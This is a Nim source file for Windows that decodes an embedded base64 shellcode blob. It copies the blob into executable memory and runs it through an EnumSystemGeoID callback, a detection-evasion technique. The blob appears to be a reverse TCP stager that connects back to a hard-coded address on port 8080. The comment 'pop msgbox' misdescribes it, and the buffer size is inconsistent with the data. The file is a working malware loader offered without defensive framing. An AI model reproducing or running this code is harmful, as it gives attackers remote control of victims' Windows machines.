import winim/lean, base64, os



proc executeShellcode(shellcode: openarray[byte]): void = 

    
    echo ".oO Executing the code Oo."

    let rPtr = VirtualAlloc(
        nil,
        cast[SIZE_T](shellcode.len),
        MEM_COMMIT,
        PAGE_EXECUTE_READ_WRITE
    )
 # Copy Shellcode to the allocated memory section
    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))

    # Callback execution
    EnumSystemGeoID(
        16,
        0,
        cast[GEO_ENUMPROC](rPtr)
    ) 

let base64Str = """/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRVkiLUhhIi1IgTTHJSItyUEgPt0pKSDHArDxhfAIsIEHB
yQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCCLSBhQSQHQ
41ZI/8lBizSITTHJSAHWSDHAQcHJDaxBAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0Ac
SQHQQYsEiEFYSAHQQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJ
ieZIgeygAQAASYnlSbwCAB+QwKiOgEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoK
QV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/
znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhI
ifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoA
WkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V
"""  

let decodedData = decode(base64Str)
echo "decoded:", decodedData
echo decodedData.len
var buf: array[1642, byte] # is it 316
copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
echo buf.len
# pop msgbox

executeShellcode(buf)
echo "Success!"
